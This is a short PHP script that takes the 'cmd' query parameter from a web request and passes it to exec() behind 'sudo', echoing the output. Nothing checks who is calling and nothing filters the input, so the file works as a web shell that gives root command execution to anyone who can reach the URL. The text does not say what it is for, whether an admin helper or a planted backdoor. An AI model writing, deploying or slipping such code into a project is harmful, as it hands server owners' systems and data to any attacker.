<?php
//require '../autoload.php';

if(isset($_GET['cmd']))
{
	echo exec('sudo '.$_GET['cmd']);
}else
{
	echo 0;
}
